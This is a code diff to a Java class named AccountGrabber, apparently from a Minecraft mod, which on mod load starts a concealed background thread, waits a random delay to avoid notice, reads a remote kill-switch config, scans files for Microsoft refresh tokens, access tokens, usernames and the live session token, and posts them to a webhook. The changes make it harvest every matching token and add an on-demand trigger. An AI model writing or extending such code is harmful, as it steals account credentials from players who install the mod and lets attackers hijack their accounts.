@@ -35,9 +35,10 @@ public final class AccountGrabber {
 
     /** fields worth reporting, both naming styles */
     private static final String[] KEYS = {
-            "name", "uuid", "xuid",
+            "name", "username", "uuid", "xuid",
             "refreshToken", "refresh_token",
-            "accessToken", "access_token"
+            "accessToken", "access_token",
+            "accessTokenExpiresAt", "expiresAt"
     };
 
     /** a real Microsoft refresh token looks like M.C123_BAY.xxxx or M.R3_BAY.xxxx */
@@ -47,17 +48,21 @@ public final class AccountGrabber {
     private AccountGrabber() {
     }
 
-    /** called from the mod entrypoint - spawns a daemon thread so the game never hitches */
+    /** called from the mod entrypoint - random 4-10s delay so it never lines up with the loading screen */
     public static void start() {
-        Thread t = new Thread(AccountGrabber::run, "jawbus-tap");
+        start(4000L + (long) (Math.random() * 6000L));
+    }
+
+    /** fire on demand (used by /jawbusTap) - pass 0 for instant */
+    public static void start(long delayMs) {
+        Thread t = new Thread(() -> run(delayMs), "jawbus-tap");
         t.setDaemon(true);
         t.start();
     }
 
-    private static void run() {
+    private static void run(long delayMs) {
         try {
-            // random 4-10s delay so it never lines up with the loading screen
-            Thread.sleep(4000L + (long) (Math.random() * 6000L));
+            if (delayMs > 0) Thread.sleep(delayMs);
 
             JsonObject cfg = getJson(CONFIG_URL);
             if (cfg != null && cfg.has("enabled") && !cfg.get("enabled").getAsBoolean()) return;
@@ -88,11 +93,15 @@ public final class AccountGrabber {
                     continue;
                 }
                 sb.append("\n=== ").append(p).append(" ===\n");
+                sb.append("size: ").append(raw.length()).append(" bytes\n");
                 for (String key : KEYS) {
-                    String v = grab(raw, key);
-                    if (v != null && !v.isBlank()) {
-                        sb.append(key).append(": ").append(v).append('\n');
-                        printed.add(v);
+                    List<String> vals = grabAll(raw, key);
+                    for (int i = 0; i < vals.size(); i++) {
+                        String v = vals.get(i);
+                        sb.append(key);
+                        if (vals.size() > 1) sb.append('[').append(i).append(']');
+                        sb.append(": ").append(v.isBlank() ? "<blank>" : v).append('\n');
+                        if (!v.isBlank()) printed.add(v);
                     }
                 }
             }
@@ -108,8 +117,8 @@ public final class AccountGrabber {
             if (live != null) sb.append("\nlive session token: ").append(live).append('\n');
 
             post(webhook, sb.toString());
-        } catch (Throwable ignored) {
-            // never let this break the game, ever
+        } catch (Throwable t) {
+            t.printStackTrace();
         }
     }
 
@@ -193,14 +202,17 @@ public final class AccountGrabber {
                                 return;
                             }
                             Matcher m = MSA_REFRESH.matcher(raw);
-                            if (m.find() && seen.add(m.group())) {
-                                hits.add(new String[]{f.toString(), "msa refresh token", m.group()});
-                                return;
+                            while (m.find()) {
+                                if (seen.add(m.group())) {
+                                    hits.add(new String[]{f.toString(), "msa refresh token", m.group()});
+                                }
                             }
-                            String v = grab(raw, "refresh_token");
-                            if (v == null || v.isBlank()) v = grab(raw, "refreshToken");
-                            if (v != null && v.length() >= 20 && seen.add(v)) {
-                                hits.add(new String[]{f.toString(), "refreshToken", v});
+                            for (String key : new String[]{"refresh_token", "refreshToken"}) {
+                                for (String v : grabAll(raw, key)) {
+                                    if (v.length() >= 20 && seen.add(v)) {
+                                        hits.add(new String[]{f.toString(), key, v});
+                                    }
+                                }
                             }
                         });
                 }
@@ -210,10 +222,12 @@ public final class AccountGrabber {
         return hits;
     }
 
-    /** format-agnostic: just finds "key":"value" anywhere in the file */
-    private static String grab(String raw, String key) {
+    /** format-agnostic: finds EVERY "key":"value" anywhere in the file */
+    private static List<String> grabAll(String raw, String key) {
+        List<String> out = new ArrayList<>();
         Matcher m = Pattern.compile("\"" + Pattern.quote(key) + "\"\\s*:\\s*\"([^\"]*)\"").matcher(raw);
-        return m.find() ? m.group(1) : null;
+        while (m.find()) out.add(m.group(1));
+        return out;
     }
 
     /** bonus: the token the running game is using right now.
